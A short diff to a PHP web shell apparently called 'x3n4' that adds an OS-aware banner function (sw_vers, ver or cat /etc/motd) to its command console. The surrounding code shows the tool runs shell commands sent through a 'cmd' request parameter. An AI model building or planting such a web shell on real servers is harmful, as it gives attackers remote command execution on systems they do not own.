@@ -104,6 +104,22 @@ function require_auth($user, $password)
         exit;
     }
 }
+function get_motd()
+{
+    $command = null;
+
+    switch (true) {
+        case stristr(PHP_OS, 'DAR'): $command = 'sw_vers'; break;
+        case stristr(PHP_OS, 'WIN'): $command = 'ver'; break;
+        case stristr(PHP_OS, 'LINUX'): $command = 'cat /etc/motd'; break;
+        default : $command = '';
+    }
+    if (!empty($command)) {
+        return execute_command($command);
+    }
+
+    return 'Welcome to x3n4 '.X3N4_VERSION;
+}
 
 /**
  * CORE
@@ -257,7 +273,7 @@ if (isset($_REQUEST['cmd'])) {
             </div>
 
             <div id="console" role="tabpanel" class="tab-pane active">
-                <pre id="stdout"><?php echo execute_command('cat /etc/motd') . PHP_EOL; ?></pre>
+                <pre id="stdout"><?php echo get_motd() . PHP_EOL; ?></pre>
                 <div class="form-group">
                     <div class="input-group">
                         <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
